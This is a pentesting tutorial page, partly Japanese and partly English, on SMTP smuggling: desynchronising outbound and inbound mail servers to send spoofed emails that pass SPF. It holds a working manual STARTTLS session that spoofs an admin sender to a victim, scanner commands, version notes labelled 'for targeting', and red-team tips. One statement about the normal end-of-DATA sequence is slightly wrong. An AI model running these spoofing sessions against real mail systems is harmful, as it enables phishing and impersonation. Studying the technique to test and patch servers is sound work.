# SMTP Smuggling

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

この種の脆弱性は[**この投稿で最初に発見されました**](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/)。その投稿では、電子メールを最終化する際のSMTPプロトコルの解釈の違いを**悪用して、正当なメールの本文内に追加のメールを密輸（smuggle）できる**ことが説明されており、これにより攻撃者が影響を受けたドメインの他のユーザ（例えば admin@outlook.com）になりすますことができ、SPFのような防御を回避できます。

### 理由

これは、SMTPプロトコルにおいてメール本文として送信される**メッセージのdata**がユーザ（攻撃者）によって制御され得るためで、パーサの違いを悪用して受信側に追加のメールを密輸するような細工データを送ることができます。元投稿のこの図を見てください。

<figure><img src="../../images/image (8) (1) (1) (1) (1).png" alt=""><figcaption><p><a href="https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png">https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png</a></p></figcaption></figure>

### 仕組み

この脆弱性を悪用するには、攻撃者が送るデータが**Outbound SMPT server はそれを1通のメールと見なすが、Inbound SMTP server はそれを複数のメールと見なす**ようにする必要があります。

研究者らは、異なる**Inboundサーバがメールメッセージのdataの終端として異なる文字列を解釈する**ことを発見しました。Outboundサーバが終端と見なさないものをInboundが終端と見なす場合があります。\
例えば、通常のdata終端は `\r\n.\r` ですが、Inbound SMTP server が `\n.` もサポートしている場合、攻撃者は自分のメールにそのデータを挿入し、新しいSMTPコマンドを開始することで追加のメールを密輸できます（上の図のように）。

もちろん、これは**Outbound SMTP server がそのデータをメッセージの終端として扱わない**場合にのみ機能します。もしOutboundもそのデータを終端と扱うなら、最終的に2通のメールとして扱われてしまい、同期ずれ（desynchronization）を悪用するこの脆弱性は成立しません。

潜在的なデシンクロナイゼーション用データの例：

- `\n.`
- `\n.\r`

また、SPFが回避される理由は、`user@outlook.com` から `admin@outlook.com` を密輸した場合でも、**送信元は依然として outlook.com である**ためです。

---

## 攻撃者のチェックリスト（どの条件が必要か？）

2通目のメールを成功裏に密輸するには、通常以下が必要です：

- 送信に使える outbound server A（多くは有効な認証情報で送信できる）で、非標準の end‑of‑DATA シーケンスを変更せずに転送すること。歴史的に多くのサービスは `\n.\r\n` や `\n.\n` のようなバリアントを転送していました。
- 受信 server B がその非標準シーケンスを end‑of‑DATA と解釈し、その後を新しい SMTP コマンド（MAIL/RCPT/DATA...）として解析すること。
- Outbound が実際に `DATA` を使って送信すること（`BDAT` ではないこと）。もし A が CHUNKING/BDAT をサポートしている場合、B が CHUNKING を広告しないなどの理由で DATA にフォールバックしない限り、長さ指定の BDAT により曖昧性が防がれ、smuggling は成立しません。
- PIPELINING は必須ではありませんが、注入したコマンドを単一の TCP 書き込み内に隠すのに役立ち、中間装置が再同期するのを防ぎます。

受信依存でテストする価値がある一般的な end‑of‑DATA バリアント：

- `\n.\n`
- `\n.\r\n`
- `\r.\r\n`
- `\r\n.\r`（末尾に裸の CR）

注：有効なのは「A が転送するもの」∩「B が受け入れるもの」の共通部分です。

---

## 手動での悪用例（単一セッション）

以下は raw STARTTLS SMTP セッションを使った考え方の例です。最初の DATA ブロックの後に非標準の終端を挿入し、その後に受信サーバが新しいメッセージとして扱う可能性のある別の SMTP ダイアログを挿入します。

<details>
<summary>手動 smuggling セッション (STARTTLS)</summary>
```
$ openssl s_client -starttls smtp -crlf -connect smtp.example.com:587
EHLO a.example
AUTH PLAIN <base64(\0user@example.com\0password)>
MAIL FROM:<user@example.com>
RCPT TO:<victim@target.com>
DATA
From: User <user@example.com>
To: victim <victim@target.com>
Subject: legit

hello A
\n.\r\nMAIL FROM:<admin@target.com>
RCPT TO:<victim@target.com>
DATA
From: Admin <admin@target.com>
To: victim <victim@target.com>
Subject: smuggled

hello B
\r\n.\r\n
```
If A forwards `\n.\r\n` and B accepts it as end‑of‑DATA, message “hello B” may be accepted as a second email from `admin@target.com` while passing SPF (aligned with A’s IPs).
</details>

Tip: When testing interactively, ensure `-crlf` is used so OpenSSL preserves CRLF in what you type.

---

## Automation and scanners

- hannob/smtpsmug: send a message ending with multiple malformed end‑of‑DATA sequences to see what a receiver accepts.
- Example: `./smtpsmug -s mail.target.com -p 25 -t victim@target.com`
- The‑Login/SMTP‑Smuggling‑Tools: scanner for both inbound and outbound sides plus an analysis SMTP server to see exactly which sequences survive a sender.
- Inbound quick check: `python3 smtp_smuggling_scanner.py victim@target.com`
- Outbound via a relay: `python3 smtp_smuggling_scanner.py YOUR@ANALYSIS.DOMAIN --outbound-smtp-server smtp.relay.com --port 587 --starttls --sender-address you@relay.com --username you@relay.com --password '...'
`

These tools help you map the A→B pairs where smuggling actually works.

---

## CHUNKING/BDAT vs DATA

- DATA uses a sentinel terminator `<CR><LF>.<CR><LF>`; any ambiguity in how CR/LF are normalized or dot‑stuffed leads to desync.
- CHUNKING (BDAT) frames the body with an exact byte length and therefore prevents classic smuggling. However, if the sender falls back to DATA (because the receiver doesn’t advertise CHUNKING), classic smuggling becomes possible again.

---

## Notes on affected software and fixes (for targeting)

- Postfix: prior to 3.9 the default tolerated bare LFs; from 3.5.23/3.6.13/3.7.9/3.8.4 admins can enable `smtpd_forbid_bare_newline`. Current recommendation is `smtpd_forbid_bare_newline = normalize` (3.8.5+/3.7.10+/3.6.14+/3.5.24+) or set to `reject` for strict RFC enforcement.
- Exim: fixed in 4.97.1 (and later) for variants relying on mixed end‑of‑DATA sequences when DATA is used. Older 4.97/4.96 may be exploitable depending on PIPELINING/CHUNKING.
- Sendmail: fixed in 8.18; older 8.17.x accepted some non‑standard terminators.
- Various libraries/servers (e.g., aiosmtpd before 1.4.5, some vendor gateways, and specific SaaS relays) had similar issues; modern versions tend to accept DATA only with strict `<CR><LF>.<CR><LF>`.

Use the scanners above to verify current behavior; many vendors changed defaults in early 2024–2025.

---

## Tips for red team ops

- Favor large commodity senders for A (historically Exchange Online, shared hosters, etc.). If they still forward some non‑standard EOM and they’re in the victim’s SPF, your smuggled MAIL FROM will inherit their reputation.
- Enumerate B’s SMTP extensions: `EHLO` banner for PIPELINING/CHUNKING; if CHUNKING is missing you have a better chance from BDAT‑first senders. Combine with malformed EOMs to probe acceptance.
- Watch headers: the smuggled message will usually create a separate Received chain starting at B. DMARC will often pass because MAIL FROM aligns with A’s IP space.

---

## **References**

- [https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/)
- [https://www.postfix.org/smtp-smuggling.html](https://www.postfix.org/smtp-smuggling.html)

{{#include ../../banners/hacktricks-training.md}}
